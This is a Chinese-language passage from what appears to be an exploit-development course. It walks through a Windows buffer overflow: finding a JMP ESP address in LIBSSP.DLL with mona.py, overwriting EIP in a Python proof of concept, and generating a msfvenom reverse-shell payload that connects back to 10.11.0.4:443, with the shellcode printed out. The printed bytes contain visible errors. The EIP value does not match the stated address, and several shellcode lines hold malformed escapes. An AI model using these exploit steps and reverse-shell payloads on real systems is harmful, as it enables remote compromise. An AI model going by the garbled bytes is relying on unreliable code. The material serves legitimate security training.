

通过搜索输出结果，我们发现 **LIBSSP.DLL** 也符合我们的需求，且地址范围似乎不包含不良字符。这非常适合我们的需求。现在，我们需要在该模块内查找一条自然存在的 JMP ESP 指令的地址。

> *高级提示：如果该应用程序启用了 DEP（数据执行保护）支持，我们的 JMP ESP 地址必须位于模块的文本代码段（text code segment）中，因为该段是唯一同时具有读取（R）和执行（E）权限的段。然而，由于 DEP 未启用，我们可以自由使用该模块中任何地址的指令。*

我们可以使用 Immunity Debugger 中的原生命令来搜索我们的 JMP ESP 指令，但搜索必须在 DLL 内的多个数据区域中进行。相反，我们可以使用 *mona.py* 对汇编指令的二进制或十六进制表示（即操作码）进行穷举搜索。

为了查找 JMP ESP 对应的操作码，我们可以使用 Metasploit 的 NASM Shell ruby 脚本 **msf-nasm\_shell**，其生成的结果如清单 357 所示：

```
kali@kali:~$ msf-nasm\_shell
nasm > jmp\ esp
00000000 FFE4             jmp\ esp
nasm >
```

*清单 357 - 查找 JMP ESP 的操作码*

我们可以使用 *mona.py find* 在 **LIBSSP.DLL** 的所有段中搜索操作码（0x**FFE4**）的十六进制表示，以查找 JMP ESP。

我们将使用 **-s** 指定搜索内容，并使用操作码十六进制字符串的转义值 **“\xff\xe4”**。

此外，我们通过 **-m** 选项指定所需模块的名称。

最终命令 `!mona find -s “\xff\xe4” -m “libssp.dll”` 的输出如图 218 所示：

![](img/ec25e59d75726b7041242a56d3376832_387_0.png)

*图 218：使用 mona.py 搜索操作码*

在此示例中，输出显示包含 JMP ESP 指令的一个地址（0x**10090c83**），幸运的是，该地址不包含我们的任何不良字符。

为了在反汇编窗口中查看 0x10090c83 的内容（此时执行已暂停），我们将点击“在反汇编器中跳转到地址”按钮（图 219）并输入地址。从这里我们可以看到它确实被转换为一条 JMP ESP 指令。

![](img/ec25e59d75726b7041242a56d3376832_388_0.png)

如果在崩溃时将 EIP 重定向到此地址，JMP ESP 指令将被执行，这将使执行流程进入我们的 shellcode。

我们可以通过在概念验证（Proof of Concept, PoC）中更新 eip 变量以反映此地址来测试这一点：

```python
...
filler = "A" * 780
eip = "\xb8\x0c\x09\x10"
offset = "C" * 4
buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
inputBuffer = filler + eip + offset + buffer
...
```

*清单 358 - 重定向 EIP*

注意，上面输入的地址是逆序的。这是因为字节序 [320] 的原因。操作系统可以以不同的格式在内存中存储地址和数据。一般来说，用于在内存中存储地址的格式取决于操作系统运行的架构。小端序（Little endian）是目前最广泛使用的格式，并被 x86 和 AMD64 架构使用，而大端序（Big endian）历史上被 Sparc 和 PowerPC 架构使用。在小端序格式中，数字的低字节存储在内存中的最低地址，高字节存储最高地址。因此，我们必须以逆序形式在缓冲区中存储返回地址，以便 CPU 能正确地在内存中解释它。

我们在调试器中按 F2，将在地址 0x10090c83 处设置断点，以便跟踪 JMP ESP 指令的执行，然后我们再次运行我们的利用程序。结果如图 220 所示：

[320] (维基百科, 2019), http://en.wikipedia.org/wiki/Endianness

![](img/ec25e59d75726b7041242a56d3376832_389_0.png)

*图 220：LIBSSP.DLL 中 JMP ESP 处的断点*

我们的调试器显示，我们确实到达了我们的 JMP ESP 并触发了之前设置的断点。在调试器中按 F7 将单步执行进入我们的 shellcode 占位符，目前它只是一堆 D。

很好！现在我们需要生成可用的 shellcode，我们的利用程序就完成了。

### 11.2.7.1 练习

- 1. 定位在利用程序中可用的 JMP ESP。
- 2. 更新你的 PoC 以包含发现的 JMP ESP，在其上设置断点，并跟踪执行到占位符 shellcode。

### 11.2.8 使用 Metasploit 生成 Shellcode

编写我们自己的自定义 shellcode 超出了本模块的范围。然而，Metasploit Framework 为我们提供了工具和实用程序，使生成复杂的载荷变得轻而易举。

MSFvenom [321] 是 Msfpayload [322] 和 Msfencode [323] 的结合，将这两个工具整合到一个单一的 Framework 实例中。它可以生成 shellcode 载荷并使用多种不同的编码器对其进行编码。

> *MSFvenom 自 2015 年 6 月 8 日起取代了 msfpayload 和 msfencode。*

目前，**msfvenom** 命令可以自动生成超过 500 个 shellcode 载荷选项，如下面的摘录所示：

```
kali@kali:~$ msfvenom -l payloads

Framework Payloads (546 total) [--payload <value>]
============================================================
```

| 名称 | 描述 |
| :----- | :----- |
| aix/ppc/shell_bind_tcp | 监听连接并启动命令 shell |
| aix/ppc/shell_find_port | 在已建立的连接上启动 shell |
| aix/ppc/shell_interact | 直接执行 /bin/sh（用于 inetd 程序） |
| aix/ppc/shell_reverse_tcp | 连接回攻击者并启动命令 shell |
| ... | ... |
| windows/shell_reverse_tcp | 连接回攻击者并启动命令 shell |

*清单 359 - 列出所有 Metasploit shellcode 载荷的命令*

msfvenom 命令相当容易使用。我们将使用 -p 生成一个名为 windows/shell_reverse_tcp 的基本载荷，它的作用类似于 Netcat 反向 shell。此载荷最少需要一个 LHOST 参数，用于定义 shell 的目标 IP 地址。还可以定义一个可选的 LPORT 参数，指定连接回来的端口，我们将使用格式标志 -f 来选择 C 语言格式的 shellcode。

生成我们的 shellcode 的完整 msfvenom 命令如下：

```
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c
No platform: Format was selected, choosing Msf::Module::Platform=::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
unsigned char buff[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x78\xc7\xfe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xec3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\xc9\x3a\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xcf\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\xb8\x58\x24\x01\xd3\xe6\x8b"
"\x0c\x4b\x58\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x42\x24"
"\x24\x5b\x58\x61\x56\x58\x53\xff\xf5\xc\x5f\x5a\x8b\x12\xeb"
"\x8b\xd5\x6b\x38\x33\x32\x00\x00\x68\x77\x73\x32\xf5\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x48\x50\x68"
"\x8a\xf8\xd4\xff\x40\x90\xd5\x09\x04\x12\x8e\xf4\x08\x59"
"\xc0\xf0\x03\x89\xd6\xe6\xd1\x89\x48\x55\x9c\xc8\xd9\x04\x12"
"\x20\x59\xc8\xe9\x79\x01\x8f\x9f\xdf\x48\x88\x02\xc2\x04\xff"
"\x44\x86\xe6\x5c\xc8\xd2\x7f\xe8\xf8\xc6\x46\x2a\x46\x6b\x06"
"\x2d\x79\x02\xa8\xbb\x89\x66\x0d\xa4\xc5\xc8\x43\xff\x74\x24"
"\x77\x99\x82\x23\x8c\xf1\xa4\x45\xdd\x6b\xf0\x5b\xc8\x39\x1f"
"\x63\x80\x44\x14\xf1\xa0\xf7\x27\xc1\x57\xc3\x8e\xb5\xc2\x68"
"\x90\xf9\x3b\x8d\xf0\x78\xe8\x9b\x04\x02\x9b\x4a\x29\x5c\xff"
"\xb8\xe5\x83\xa6\xa2\x65\x4d\xc4\xe0\x00\x8b\x84\xa9\x96\x3e"
"\x75\xf7\x9d\x0c\x5f\x46\x3a\xd8\x50\x21\x9d\x72\x87\xc3\x5b"
"\xa1\x24\xe6\xa5\x49\x4a\xbb\x73\xdd\x3b\x59\xa5\x54\x58\x9b\x22"
"\x2f\x20\x28\xe6\x8d\x25\xff\x2b\x1c\x10\x39\xc0\x83\x80\x55\x4d"
"\x25\x60\x4e\x42\xa5\x4d\x84\xa2\xbb\x25\x24\xa8\x5a\x3f\x9f\x06"
"\x8f\xdf\x5b\x59\x44\xa5\x64\x6f\xc7\x2a\x02\xc9\xff\x46\x5b"
"\x56\x6c\x79\xf3\x28\xbb\x2e\x9a\x8b\x35\xc1\x22\x25\x4c\xe5"
```

*清单 360 - 生成 metasploit shellcode*

这看起来很简单，但如果仔细查看，我们可以在生成的 shellcode 中识别出不良字符（例如空字节）。

当我们无法使用通用的 shellcode 时，我们必须对其进行编码以适配我们的目标利用环境。这可能意味着将我们的 shellcode 转换为纯字母数字载荷，去除不良字符等。

[321] (Wei Chen, 2014), https://blog.rapid7.com/2014/12/09/good-bye-msfpayload-and-msfencode/
[322] (Offensive Security, 2015), https://www.offensive-security.com/metasploit-unleashed/msfpayload/
[323] (Offensive Security, 2015), https://www.offensive-security.com/metasploit-unleashed/msfencode/

